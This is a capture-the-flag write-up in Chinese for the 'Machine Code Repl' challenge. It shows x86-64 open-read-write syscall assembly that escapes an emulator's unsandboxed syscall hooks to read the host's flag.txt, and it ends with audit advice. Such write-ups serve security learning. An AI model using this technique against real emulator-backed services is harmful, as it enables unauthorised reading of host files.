# Machine Code Repl

## 题目简述

服务用 Keystone 汇编并在 Unicorn 中逐条执行用户输入的 x86-64 指令，同时自己实现 `read`、`write`、`open`、`close` 等 Linux syscall。没有文件路径白名单或 syscall 限制，因此可以直接编写 ORW（open-read-write）指令序列读取服务目录中的 `flag.txt`。

## 解题过程

先把字符串 `flag.txt` 写到模拟栈。当前 `rax` 初始为 0，直接调用 `read(0, rsp, 0x100)`：

```asm
mov rsi, rsp
mov rdx, 0x100
syscall
```

服务提示输入时发送 `flag.txt`。然后调用 `open`，返回的新文件描述符为 3：

```asm
mov rax, 2
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall
```

继续把文件读回栈，再写到标准输出：

```asm
mov rax, 0
mov rdi, 3
mov rsi, rsp
mov rdx, 0x100
syscall

mov rax, 1
mov rdi, 1
mov rsi, rsp
mov rdx, 0x100
syscall
```

官方 solver 使用 `sendlineafter` 逐条发送这些指令，并在第一次 `read` 的输入提示处发送文件名。最后标准输出包含：

```text
grey{hey_why_you_reading_my_files?}
```

## 方法总结

- 核心技巧：在允许用户执行汇编的模拟器中直接构造 ORW syscall 链。
- 识别信号：任意指令输入、可控寄存器、开放的文件 syscall，以及宿主文件路径未经隔离地传给 Python `open`。
- 复用要点：模拟器并不天然安全；应审计 syscall hook 最终访问的是虚拟资源还是宿主资源，并跟踪每次 syscall 的返回寄存器和缓冲区位置。
